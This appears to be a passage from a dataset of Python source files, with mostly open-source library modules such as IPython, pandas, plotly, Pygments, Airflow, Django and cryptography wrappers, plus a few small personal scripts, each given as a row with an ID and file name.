    print(customized_fcompiler(compiler='armflang').get_version())
"
JY167	JY167-nbbase.py	"""""""The basic dict based notebook format.

Authors:

* Brian Granger
""""""

# -----------------------------------------------------------------------------
#  Copyright (C) 2008-2011  The IPython Development Team
#
#  Distributed under the terms of the BSD License.  The full license is in
#  the file COPYING, distributed as part of this software.
# -----------------------------------------------------------------------------

# -----------------------------------------------------------------------------
# Imports
# -----------------------------------------------------------------------------

from .._struct import Struct

# -----------------------------------------------------------------------------
# Code
# -----------------------------------------------------------------------------


class NotebookNode(Struct):
    pass


def from_dict(d):
    if isinstance(d, dict):
        newd = NotebookNode()
        for k, v in d.items():
            newd[k] = from_dict(v)
        return newd
    elif isinstance(d, (tuple, list)):
        return [from_dict(i) for i in d]
    else:
        return d


def new_code_cell(code=None, prompt_number=None):
    """"""Create a new code cell with input and output""""""
    cell = NotebookNode()
    cell.cell_type = ""code""
    if code is not None:
        cell.code = str(code)
    if prompt_number is not None:
        cell.prompt_number = int(prompt_number)
    return cell


def new_text_cell(text=None):
    """"""Create a new text cell.""""""
    cell = NotebookNode()
    if text is not None:
        cell.text = str(text)
    cell.cell_type = ""text""
    return cell


def new_notebook(cells=None):
    """"""Create a notebook by name, id and a list of worksheets.""""""
    nb = NotebookNode()
    if cells is not None:
        nb.cells = cells
    else:
        nb.cells = []
    return nb"
JY38	JY38-cascade_mask_rcnn_regnetx-3.2GF_fpn_mstrain_3x_coco.py	"_base_ = [
    '../common/mstrain_3x_coco_instance.py',
    '../_base_/models/cascade_mask_rcnn_r50_fpn.py'
]
model = dict(
    backbone=dict(
        _delete_=True,
        type='RegNet',
        arch='regnetx_3.2gf',
        out_indices=(0, 1, 2, 3),
        frozen_stages=1,
        norm_cfg=dict(type='BN', requires_grad=True),
        norm_eval=True,
        style='pytorch',
        init_cfg=dict(
            type='Pretrained', checkpoint='open-mmlab://regnetx_3.2gf')),
    neck=dict(
        type='FPN',
        in_channels=[96, 192, 432, 1008],
        out_channels=256,
        num_outs=5))
img_norm_cfg = dict(
    # The mean and std are used in PyCls when training RegNets
    mean=[103.53, 116.28, 123.675],
    std=[57.375, 57.12, 58.395],
    to_rgb=False)
train_pipeline = [
    # Images are converted to float32 directly after loading in PyCls
    dict(type='LoadImageFromFile'),
    dict(type='LoadAnnotations', with_bbox=True, with_mask=True),
    dict(
        type='Resize',
        img_scale=[(1333, 640), (1333, 800)],
        multiscale_mode='range',
        keep_ratio=True),
    dict(type='RandomFlip', flip_ratio=0.5),
    dict(type='Normalize', **img_norm_cfg),
    dict(type='Pad', size_divisor=32),
    dict(type='DefaultFormatBundle'),
    dict(type='Collect', keys=['img', 'gt_bboxes', 'gt_labels', 'gt_masks']),
]
test_pipeline = [
    dict(type='LoadImageFromFile'),
    dict(
        type='MultiScaleFlipAug',
        img_scale=(1333, 800),
        flip=False,
        transforms=[
            dict(type='Resize', keep_ratio=True),
            dict(type='RandomFlip'),
            dict(type='Normalize', **img_norm_cfg),
            dict(type='Pad', size_divisor=32),
            dict(type='ImageToTensor', keys=['img']),
            dict(type='Collect', keys=['img']),
        ])
]

data = dict(
    train=dict(dataset=dict(pipeline=train_pipeline)),
    val=dict(pipeline=test_pipeline),
    test=dict(pipeline=test_pipeline))

optimizer = dict(weight_decay=0.00005)"
JY549	JY549-_arrow_utils.py	"from __future__ import annotations

import warnings

import numpy as np
import pyarrow

from pandas.errors import PerformanceWarning
from pandas.util._exceptions import find_stack_level


def fallback_performancewarning(version: str | None = None) -> None:
    """"""
    Raise a PerformanceWarning for falling back to ExtensionArray's
    non-pyarrow method
    """"""
    msg = ""Falling back on a non-pyarrow code path which may decrease performance.""
    if version is not None:
        msg += f"" Upgrade to pyarrow >={version} to possibly suppress this warning.""
    warnings.warn(msg, PerformanceWarning, stacklevel=find_stack_level())


def pyarrow_array_to_numpy_and_mask(
    arr, dtype: np.dtype
) -> tuple[np.ndarray, np.ndarray]:
    """"""
    Convert a primitive pyarrow.Array to a numpy array and boolean mask based
    on the buffers of the Array.

    At the moment pyarrow.BooleanArray is not supported.

    Parameters
    ----------
    arr : pyarrow.Array
    dtype : numpy.dtype

    Returns
    -------
    (data, mask)
        Tuple of two numpy arrays with the raw data (with specified dtype) and
        a boolean mask (validity mask, so False means missing)
    """"""
    dtype = np.dtype(dtype)

    buflist = arr.buffers()
    # Since Arrow buffers might contain padding and the data might be offset,
    # the buffer gets sliced here before handing it to numpy.
    # See also https://github.com/pandas-dev/pandas/issues/40896
    offset = arr.offset * dtype.itemsize
    length = len(arr) * dtype.itemsize
    data_buf = buflist[1][offset : offset + length]
    data = np.frombuffer(data_buf, dtype=dtype)
    bitmask = buflist[0]
    if bitmask is not None:
        mask = pyarrow.BooleanArray.from_buffers(
            pyarrow.bool_(), len(arr), [None, bitmask], offset=arr.offset
        )
        mask = np.asarray(mask)
    else:
        mask = np.ones(len(arr), dtype=bool)
    return data, mask"
JD126	JD126-base.py	"# This file is dual licensed under the terms of the Apache License, Version
# 2.0, and the BSD License. See the LICENSE file in the root of this repository
# for complete details.


import typing

from cryptography.hazmat.primitives.asymmetric import dh
from cryptography.hazmat.primitives.asymmetric.types import (
    PRIVATE_KEY_TYPES,
    PUBLIC_KEY_TYPES,
)


def load_pem_private_key(
    data: bytes,
    password: typing.Optional[bytes],
    backend: typing.Any = None,
    *,
    unsafe_skip_rsa_key_validation: bool = False,
) -> PRIVATE_KEY_TYPES:
    from cryptography.hazmat.backends.openssl.backend import backend as ossl

    return ossl.load_pem_private_key(
        data, password, unsafe_skip_rsa_key_validation
    )


def load_pem_public_key(
    data: bytes, backend: typing.Any = None
) -> PUBLIC_KEY_TYPES:
    from cryptography.hazmat.backends.openssl.backend import backend as ossl

    return ossl.load_pem_public_key(data)


def load_pem_parameters(
    data: bytes, backend: typing.Any = None
) -> ""dh.DHParameters"":
    from cryptography.hazmat.backends.openssl.backend import backend as ossl

    return ossl.load_pem_parameters(data)


def load_der_private_key(
    data: bytes,
    password: typing.Optional[bytes],
    backend: typing.Any = None,
    *,
    unsafe_skip_rsa_key_validation: bool = False,
) -> PRIVATE_KEY_TYPES:
    from cryptography.hazmat.backends.openssl.backend import backend as ossl

    return ossl.load_der_private_key(
        data, password, unsafe_skip_rsa_key_validation
    )


def load_der_public_key(
    data: bytes, backend: typing.Any = None
) -> PUBLIC_KEY_TYPES:
    from cryptography.hazmat.backends.openssl.backend import backend as ossl

    return ossl.load_der_public_key(data)


def load_der_parameters(
    data: bytes, backend: typing.Any = None
) -> ""dh.DHParameters"":
    from cryptography.hazmat.backends.openssl.backend import backend as ossl

    return ossl.load_der_parameters(data)"
JY287	JY287-0061_2_0_0_increase_length_of_pool_name.py	"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
""""""Increase length of pool name

Revision ID: b25a55525161
Revises: bbf4a7ad0465
Create Date: 2020-03-09 08:48:14.534700

""""""
from __future__ import annotations

import sqlalchemy as sa
from alembic import op

from airflow.models.base import COLLATION_ARGS

# revision identifiers, used by Alembic.
revision = ""b25a55525161""
down_revision = ""bbf4a7ad0465""
branch_labels = None
depends_on = None
airflow_version = ""2.0.0""


def upgrade():
    """"""Increase column length of pool name from 50 to 256 characters""""""
    # use batch_alter_table to support SQLite workaround
    with op.batch_alter_table(""slot_pool"", table_args=sa.UniqueConstraint(""pool"")) as batch_op:
        batch_op.alter_column(""pool"", type_=sa.String(256, **COLLATION_ARGS))


def downgrade():
    """"""Revert Increased length of pool name from 256 to 50 characters""""""
    with op.batch_alter_table(""slot_pool"", table_args=sa.UniqueConstraint(""pool"")) as batch_op:
        batch_op.alter_column(""pool"", type_=sa.String(50))"
JY204	JY204-syspathcontext.py	"# encoding: utf-8
""""""
Context managers for adding things to sys.path temporarily.

Authors:

* Brian Granger
""""""

#-----------------------------------------------------------------------------
#  Copyright (C) 2008-2011  The IPython Development Team
#
#  Distributed under the terms of the BSD License.  The full license is in
#  the file COPYING, distributed as part of this software.
#-----------------------------------------------------------------------------

import sys
import warnings


class appended_to_syspath(object):
    """"""
    Deprecated since IPython 8.1, no replacements.

    A context for appending a directory to sys.path for a second.""""""

    def __init__(self, dir):
        warnings.warn(
            ""`appended_to_syspath` is deprecated since IPython 8.1, and has no replacements"",
            DeprecationWarning,
            stacklevel=2,
        )
        self.dir = dir

    def __enter__(self):
        if self.dir not in sys.path:
            sys.path.append(self.dir)
            self.added = True
        else:
            self.added = False

    def __exit__(self, type, value, traceback):
        if self.added:
            try:
                sys.path.remove(self.dir)
            except ValueError:
                pass
        # Returning False causes any exceptions to be re-raised.
        return False

class prepended_to_syspath(object):
    """"""A context for prepending a directory to sys.path for a second.""""""

    def __init__(self, dir):
        self.dir = dir

    def __enter__(self):
        if self.dir not in sys.path:
            sys.path.insert(0,self.dir)
            self.added = True
        else:
            self.added = False

    def __exit__(self, type, value, traceback):
        if self.added:
            try:
                sys.path.remove(self.dir)
            except ValueError:
                pass
        # Returning False causes any exceptions to be re-raised.
        return False"
JD214	JD214-test_util.py	"import os

import pytest

import pandas.compat as compat

import pandas._testing as tm


def test_rands():
    r = tm.rands(10)
    assert len(r) == 10


def test_rands_array_1d():
    arr = tm.rands_array(5, size=10)
    assert arr.shape == (10,)
    assert len(arr[0]) == 5


def test_rands_array_2d():
    arr = tm.rands_array(7, size=(10, 10))
    assert arr.shape == (10, 10)
    assert len(arr[1, 1]) == 7


def test_numpy_err_state_is_default():
    expected = {""over"": ""warn"", ""divide"": ""warn"", ""invalid"": ""warn"", ""under"": ""ignore""}
    import numpy as np

    # The error state should be unchanged after that import.
    assert np.geterr() == expected


def test_convert_rows_list_to_csv_str():
    rows_list = [""aaa"", ""bbb"", ""ccc""]
    ret = tm.convert_rows_list_to_csv_str(rows_list)

    if compat.is_platform_windows():
        expected = ""aaa\r\nbbb\r\nccc\r\n""
    else:
        expected = ""aaa\nbbb\nccc\n""

    assert ret == expected


def test_create_temp_directory():
    with tm.ensure_clean_dir() as path:
        assert os.path.exists(path)
        assert os.path.isdir(path)
    assert not os.path.exists(path)


@pytest.mark.parametrize(""strict_data_files"", [True, False])
def test_datapath_missing(datapath):
    with pytest.raises(ValueError, match=""Could not find file""):
        datapath(""not_a_file"")


def test_datapath(datapath):
    args = (""io"", ""data"", ""csv"", ""iris.csv"")

    result = datapath(*args)
    expected = os.path.join(os.path.dirname(os.path.dirname(__file__)), *args)

    assert result == expected


def test_rng_context():
    import numpy as np

    expected0 = 1.764052345967664
    expected1 = 1.6243453636632417

    with tm.RNGContext(0):
        with tm.RNGContext(1):
            assert np.random.randn() == expected1
        assert np.random.randn() == expected0


def test_external_error_raised():
    with tm.external_error_raised(TypeError):
        raise TypeError(""Should not check this error message, so it will pass"")"
JD1	JD1-mapimg.py	"import numpy as np
import matplotlib.pyplot as plt
import sys


dem = np.load('../mapdata/dem.npz')
X = dem['x']
Y = dem['y']
Z = dem['z']
STXY = np.load('../mapdata/stxy.npz')
STX = STXY['stx']
STY = STXY['sty']
STX_idx = STXY['stx_idx']
STY_idx = STXY['sty_idx']
Crxy = np.load('../mapdata/craterxy.npz') 
Crx = Crxy['x']
Cry = Crxy['y']

fig = plt.figure(figsize=(6,6))
ax = plt.subplot(111)
im = ax.pcolormesh(X, Y, Z, cmap='terrain', vmin=-400, vmax=1600, rasterized=True)
ax.scatter(STX, STY, marker='v', color='k', s=60)
ax.scatter(X[Crx], Y[Cry], marker='^', color='red', s=60)

stations = ['N.ASIV', 'N.ASHV', 'N.ASNV', 'N.ASTV',  'V.ASOB', 'V.ASO2', 'V.ASOC']
for i in range(len(stations)):
    if stations[i]=='V.ASOB':
        ax.annotate(stations[i], # this is the text
            (STX[i],STY[i]), # these are the coordinates to position the label
            textcoords=""offset points"", # how to position the text
            xytext=(-5,6), # distance from text to points (x,y)
            ha='right', fontsize=14) # horizontal alignment can be left, right or center
    elif stations[i]=='V.ASO2':
        ax.annotate(stations[i], # this is the text
            (STX[i],STY[i]), # these are the coordinates to position the label
            textcoords=""offset points"", # how to position the text
            xytext=(-2,6), # distance from text to points (x,y)
            ha='left', fontsize=14) # horizontal alignment can be left, right or center
    else:
        ax.annotate(stations[i], # this is the text
            (STX[i],STY[i]), # these are the coordinates to position the label
            textcoords=""offset points"", # how to position the text
            xytext=(0,8), # distance from text to points (x,y)
            ha='center', fontsize=14) # horizontal alignment can be left, right or center

plt.xlabel('Easting [m]', fontsize=14)
plt.ylabel('Northing [m]', fontsize=14)
plt.tight_layout()

plt.savefig(""map.png"", dpi=300, bbox_inches=""tight"", pad_inches=0.05)
plt.show()"
JD293	JD293-makeIco.py	"#!/usr/bin/env python3
#
# Make a DWIN .ico file from a directory of JPEG icon files.
#
#  Copyright (c) 2020 Brent Burton
#
#  This program is free software: you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation, either version 3 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program.  If not, see <https://www.gnu.org/licenses/>.
#----------------------------------------------------------------

import os.path
import argparse
import DWIN_ICO

version = '2.0.7'

#----------------
if __name__ == '__main__':
    try:
        parser = argparse.ArgumentParser(description='Make .ico from JPEG files')
        parser.add_argument('iconDir', type=str, nargs=1,
                            help='name of directory containing icon JPGs')
        parser.add_argument('filename', type=str, nargs=1,
                            help='name of new .ico file to create')
        args = parser.parse_args()

        filename = args.filename[0]
        iconDir = args.iconDir[0]

        if os.path.isfile(filename):
            raise RuntimeError(""ICO file '%s' already exists."" % (filename))

        if not os.path.exists(iconDir):
            raise RuntimeError(""Icon directory '%s' doesn't exist."" % (iconDir))

        print(""Making .ico file '%s' from contents of '%s'"" % (filename, iconDir))
        ico = DWIN_ICO.DWIN_ICO_File()
        ico.createFile(iconDir, filename)

    except Exception as e:
        print('Error: ', e)
"
JY402	JY402-_textfont.py	"import _plotly_utils.basevalidators


class TextfontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""textfont"", parent_name=""funnel"", **kwargs):
        super(TextfontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Textfont""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JD198	JD198-autumn.py	"""""""
    pygments.styles.autumn
    ~~~~~~~~~~~~~~~~~~~~~~

    A colorful style, inspired by the terminal highlighting style.

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.style import Style
from pygments.token import Keyword, Name, Comment, String, Error, \
     Number, Operator, Generic, Whitespace


class AutumnStyle(Style):
    """"""
    A colorful style, inspired by the terminal highlighting style.
    """"""

    styles = {
        Whitespace:                 '#bbbbbb',

        Comment:                    'italic #aaaaaa',
        Comment.Preproc:            'noitalic #4c8317',
        Comment.Special:            'italic #0000aa',

        Keyword:                    '#0000aa',
        Keyword.Type:               '#00aaaa',

        Operator.Word:              '#0000aa',

        Name.Builtin:               '#00aaaa',
        Name.Function:              '#00aa00',
        Name.Class:                 'underline #00aa00',
        Name.Namespace:             'underline #00aaaa',
        Name.Variable:              '#aa0000',
        Name.Constant:              '#aa0000',
        Name.Entity:                'bold #800',
        Name.Attribute:             '#1e90ff',
        Name.Tag:                   'bold #1e90ff',
        Name.Decorator:             '#888888',

        String:                     '#aa5500',
        String.Symbol:              '#0000aa',
        String.Regex:               '#009999',

        Number:                     '#009999',

        Generic.Heading:            'bold #000080',
        Generic.Subheading:         'bold #800080',
        Generic.Deleted:            '#aa0000',
        Generic.Inserted:           '#00aa00',
        Generic.Error:              '#aa0000',
        Generic.Emph:               'italic',
        Generic.Strong:             'bold',
        Generic.Prompt:             '#555555',
        Generic.Output:             '#888888',
        Generic.Traceback:          '#aa0000',

        Error:                      '#F00 bg:#FAA'
    }"
JD311	JD311-translate_v3_batch_translate_text_with_glossary_test.py	"# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import os
import uuid

import backoff
from google.cloud import storage
import pytest

import translate_v3_batch_translate_text_with_glossary


PROJECT_ID = os.environ[""GOOGLE_CLOUD_PROJECT""]
GLOSSARY_ID = ""DO_NOT_DELETE_TEST_GLOSSARY""


def get_ephemeral_bucket():
    """"""Create a temporary bucket to store annotation output.""""""
    bucket_name = f""tmp-{uuid.uuid4().hex}""
    storage_client = storage.Client()
    bucket = storage_client.create_bucket(bucket_name)

    yield bucket

    bucket.delete(force=True)


@pytest.fixture(scope=""function"")
def bucket():
    """"""Create a bucket feature for testing""""""
    return next(get_ephemeral_bucket())


def on_backoff(invocation_dict):
    """"""Backoff callback; create a testing bucket for each backoff run""""""
    invocation_dict[""kwargs""][""bucket""] = next(get_ephemeral_bucket())


# If necessary, retry test function while backing off the timeout sequentially
MAX_TIMEOUT = 500


@backoff.on_exception(
    wait_gen=lambda: (wait_time for wait_time in [100, 250, 300, MAX_TIMEOUT]),
    exception=Exception,
    max_tries=5,
    on_backoff=on_backoff,
)
def test_batch_translate_text_with_glossary(capsys, bucket):

    translate_v3_batch_translate_text_with_glossary.batch_translate_text_with_glossary(
        ""gs://cloud-samples-data/translation/text_with_glossary.txt"",
        ""gs://{}/translation/BATCH_TRANSLATION_GLOS_OUTPUT/"".format(bucket.name),
        PROJECT_ID,
        GLOSSARY_ID,
        MAX_TIMEOUT,
    )

    out, _ = capsys.readouterr()
    assert ""Total Characters: 9"" in out"
JY365	JY365-_hoverlabel.py	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""histogram"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
JY370	JY370-_hoverlabel.py	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""histogram2d"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
JD382	JD382-_hoverlabel.py	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""densitymapbox"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
JD182	JD182-app.py	"import customtkinter as ctk
from mensagems import mensagem
janela = ctk.CTk() #Criando a janela

janela._set_appearance_mode(""light"") #Setando a aparência 
janela.title(""Wikipedia"") #Setando o titulo da janela
janela.geometry(""1280x700"") #Setando o tamanho inicial da janela
janela.resizable(width=False, height=False) #Pode configurar se a altura/largura é reconfiguravel

frame_header = ctk.CTkFrame(master=janela, width=1280, height=30, fg_color=""#DCDAD9"").place(x=1, y=1)
frame_menu = ctk.CTkFrame(master=janela, width=280, height=700, fg_color=""#DCDAD9"").place(x=1, y=1)

historia_ativada = False
funcionamento_ativada =  False
def historia():
    global mensagem  
    global historia_ativada 
    global funcionamento_ativada
    funcionamento_ativada = False
    if historia_ativada:
        return
    historia_ativada = True
    textbox.delete(""0.0"", ""end"")
    textbox.insert(""0.0"", mensagem)

def funcionamento():
    global funcionamento_ativada
    global historia_ativada
    historia_ativada = False
    if funcionamento_ativada:
        return
    funcionamento_ativada = True
    textbox.delete(""0.0"", ""end"")

btn_1 = ctk.CTkButton(
    janela, text=""História dos Sistemas Operacionais"",
    border_width=0,
    border_color=""black"",
    fg_color = ""#DCDAD9"",
    text_color=""black"",
    hover=True,
    hover_color=""#BFBFBF"",
    corner_radius=0,
    command=historia
    ).place(x=10, y=50)
btn_2 = ctk.CTkButton(
    janela, text=""Funcionamento do SO"",
    border_width=0,
    border_color=""black"",
    fg_color = ""#DCDAD9"",
    text_color=""black"",
    hover=True,
    hover_color=""#BFBFBF"",
    corner_radius=0,
    command=funcionamento
    ).place(x=10, y=90)

label = ctk.CTkLabel(master=janela, text=""Wikipedia"", fg_color=""#DCDAD9"")
label.place(x=640, y=3)
assuntos = ctk.CTkLabel(master=janela, text=""Assuntos"", fg_color=""#DCDAD9"")
assuntos.place(x=100, y=3)

textbox = ctk.CTkTextbox(janela, width=800, height=600)
textbox.place(x=300, y=50)

janela.mainloop() #Iniciando a janela"
JY560	JY560-models.py	"""""""
 The GeometryColumns and SpatialRefSys models for the SpatiaLite backend.
""""""
from django.contrib.gis.db.backends.base.models import SpatialRefSysMixin
from django.db import models


class SpatialiteGeometryColumns(models.Model):
    """"""
    The 'geometry_columns' table from SpatiaLite.
    """"""
    f_table_name = models.CharField(max_length=256)
    f_geometry_column = models.CharField(max_length=256)
    coord_dimension = models.IntegerField()
    srid = models.IntegerField(primary_key=True)
    spatial_index_enabled = models.IntegerField()
    type = models.IntegerField(db_column='geometry_type')

    class Meta:
        app_label = 'gis'
        db_table = 'geometry_columns'
        managed = False

    def __str__(self):
        return '%s.%s - %dD %s field (SRID: %d)' % (
            self.f_table_name,
            self.f_geometry_column,
            self.coord_dimension,
            self.type,
            self.srid,
        )

    @classmethod
    def table_name_col(cls):
        """"""
        Return the name of the metadata column used to store the feature table
        name.
        """"""
        return 'f_table_name'

    @classmethod
    def geom_col_name(cls):
        """"""
        Return the name of the metadata column used to store the feature
        geometry column.
        """"""
        return 'f_geometry_column'


class SpatialiteSpatialRefSys(models.Model, SpatialRefSysMixin):
    """"""
    The 'spatial_ref_sys' table from SpatiaLite.
    """"""
    srid = models.IntegerField(primary_key=True)
    auth_name = models.CharField(max_length=256)
    auth_srid = models.IntegerField()
    ref_sys_name = models.CharField(max_length=256)
    proj4text = models.CharField(max_length=2048)
    srtext = models.CharField(max_length=2048)

    class Meta:
        app_label = 'gis'
        db_table = 'spatial_ref_sys'
        managed = False

    @property
    def wkt(self):
        return self.srtext"
JY449	JY449-test_offsets_properties.py	"""""""
Behavioral based tests for offsets and date_range.

This file is adapted from https://github.com/pandas-dev/pandas/pull/18761 -
which was more ambitious but less idiomatic in its use of Hypothesis.

You may wish to consult the previous version for inspiration on further
tests, or when trying to pin down the bugs exposed by the tests below.
""""""
from hypothesis import (
    assume,
    given,
)
import pytest
import pytz

import pandas as pd
from pandas._testing._hypothesis import (
    DATETIME_JAN_1_1900_OPTIONAL_TZ,
    YQM_OFFSET,
)

# ----------------------------------------------------------------
# Offset-specific behaviour tests


@pytest.mark.arm_slow
@given(DATETIME_JAN_1_1900_OPTIONAL_TZ, YQM_OFFSET)
def test_on_offset_implementations(dt, offset):
    assume(not offset.normalize)
    # check that the class-specific implementations of is_on_offset match
    # the general case definition:
    #   (dt + offset) - offset == dt
    try:
        compare = (dt + offset) - offset
    except (pytz.NonExistentTimeError, pytz.AmbiguousTimeError):
        # When dt + offset does not exist or is DST-ambiguous, assume(False) to
        # indicate to hypothesis that this is not a valid test case
        # DST-ambiguous example (GH41906):
        # dt = datetime.datetime(1900, 1, 1, tzinfo=pytz.timezone('Africa/Kinshasa'))
        # offset = MonthBegin(66)
        assume(False)

    assert offset.is_on_offset(dt) == (compare == dt)


@given(YQM_OFFSET)
def test_shift_across_dst(offset):
    # GH#18319 check that 1) timezone is correctly normalized and
    # 2) that hour is not incorrectly changed by this normalization
    assume(not offset.normalize)

    # Note that dti includes a transition across DST boundary
    dti = pd.date_range(
        start=""2017-10-30 12:00:00"", end=""2017-11-06"", freq=""D"", tz=""US/Eastern""
    )
    assert (dti.hour == 12).all()  # we haven't screwed up yet

    res = dti + offset
    assert (res.hour == 12).all()"
JY114	JY114-onoff.py	"""""""Models an on/off device.""""""
from __future__ import annotations
from typing import Any

from .. import ApiSession
from ..info import HomeInfo

from .device import Device
from .const import DeviceType, DeviceTypeId


class OnOffDevice(Device):
    """"""Models an on/off device with a single on/off state and command.""""""

    def __init__(
        self,
        session: ApiSession,
        home: HomeInfo,
        data: dict,
        device_type: DeviceType,
        device_type_id: int
    ) -> None:
        super().__init__(session, home, data, device_type, device_type_id, do_update=False)
        self.is_on: bool = False
        self.update(data)

    def update(self, data: dict[str, Any]):
        """"""Update the radiator from cloud API data.""""""
        super().update(data)
        self.is_on = data[""on_off""] == ""1""

    async def set_onoff_state(self, turn_on: bool):
        """"""Set the onoff state, on (true) or off (false)""""""
        if turn_on == self.is_on:
            return

        query_params = {}
        query_params[""id_device""] = self.id_local
        query_params[""on_off""] = ""1"" if turn_on else ""0""
        query_params[""nv_mode""] = self.device_type_id
        query_params[""gv_mode""] = self.device_type_id

        await self._session.write_query(self.home.home_id, query_params)

        # This is debatable - for some scenarios it is reasonable to
        # update the value in the current object with the assumed
        # change, for others not
        self.is_on = turn_on

class Light(OnOffDevice):
    """"""Models a light.""""""

    def __init__(
        self,
        session: ApiSession,
        home: HomeInfo,
        data: dict
    ) -> None:
        super().__init__(session, home, data, DeviceType.LIGHT, DeviceTypeId.LIGHT)

class Outlet(OnOffDevice):
    """"""Models an outlet.""""""

    def __init__(
        self,
        session: ApiSession,
